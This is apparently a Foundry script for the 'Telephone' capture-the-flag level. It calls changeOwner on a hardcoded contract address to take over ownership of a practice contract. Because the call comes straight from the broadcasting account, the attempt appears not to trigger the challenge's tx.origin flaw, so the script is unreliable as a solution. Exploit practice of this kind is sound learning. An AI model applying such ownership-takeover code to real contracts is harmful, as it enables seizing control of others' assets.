// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel04.sol";

contract POC is Script {
    Telephone level4 = Telephone(0xf2585aB001D77CEF708d2E435D60F9Dbd4fC4aB4);

    function run() external {
        vm.startBroadcast();

        console.log("Current Owner is: ", level4.owner());
        level4.changeOwner(0xEAce4b71CA1A128e8B562561f46896D55B9B0246);
        console.log("New Owner is: ", level4.owner());
        
        vm.stopBroadcast();
    }
}